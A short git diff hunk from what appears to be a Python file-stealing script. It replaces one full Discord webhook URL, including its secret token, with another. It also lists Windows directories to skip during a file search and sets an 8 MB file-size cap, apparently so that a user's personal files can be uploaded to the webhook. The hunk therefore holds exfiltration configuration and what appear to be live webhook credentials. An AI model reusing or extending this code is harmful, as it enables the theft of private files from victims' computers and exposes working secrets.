@@ -29,7 +29,7 @@ path = "C:\\Users\\%a" % user
 
 
 # Replace with your Discord webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1183011750610751539/5pbfhYiAne_g_NT1DXKX_m6wDxrwpsJvmYxP6YSUIkY6fflQS6YVsiJnGOcpmB3-kF9_"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1183181478645997698/bmS94RKPMhnfSInRJZ2fu_0zctdvhRXi1wTj5lfbJ91jVEehz90MGk09DWKP12iyJMQQ"
 # Directories to ignore during file search
 BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\%a\\AppData\\', 'C:\\Users\\%a\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\']
 MAX_FILE_SIZE_MB = 8
